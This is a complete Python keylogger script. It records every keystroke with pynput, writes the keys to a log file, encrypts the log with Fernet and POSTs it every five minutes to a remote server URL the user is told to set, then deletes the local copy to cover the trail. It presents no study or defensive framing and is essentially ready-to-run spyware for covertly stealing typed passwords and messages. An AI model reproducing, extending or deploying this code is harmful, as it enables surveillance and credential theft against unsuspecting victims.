import os
import requests
from pynput import keyboard
from cryptography.fernet import Fernet
from threading import Timer

# === Configuration ===
ENCRYPTION_KEY = b'place your key here'  # Replace with your AES key from generate_key.py
SERVER_URL = "http://127.0.0.1:5000/upload"  # Change to your server
SEND_INTERVAL = 300  # Send data every 5 minutes (300 seconds)

cipher = Fernet(ENCRYPTION_KEY)
log_file = "keylog_http.txt"
keys = []

# === Function to Capture Keystrokes ===
def on_press(key):
    try:
        keys.append(key.char)
    except AttributeError:
        keys.append(f'[{key}]')

# === Function to Write Logs to File ===
def write_log():
    with open(log_file, "a") as f:
        for key in keys:
            f.write(f"{key} ")
    keys.clear()

# === Encrypt Log File ===
def encrypt_file(file_path):
    with open(file_path, "rb") as f:
        data = f.read()
    encrypted_data = cipher.encrypt(data)
    return encrypted_data

# === Send Encrypted Data to Remote Server ===
def send_http(encrypted_data):
    try:
        response = requests.post(SERVER_URL, data=encrypted_data, timeout=10)
        if response.status_code == 200:
            print("[+] Data sent successfully.")
        else:
            print(f"[!] Server responded with {response.status_code}")
    except Exception as e:
        print(f"[!] Failed to send data: {e}")

# === Main Reporting Function ===
def report():
    write_log()
    if os.path.exists(log_file):
        encrypted = encrypt_file(log_file)
        send_http(encrypted)
        os.remove(log_file)
    Timer(SEND_INTERVAL, report).start()

# === Start Keylogger ===
def start_keylogger():
    print("[+] Keylogger HTTP started (Running in background)...")
    report()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
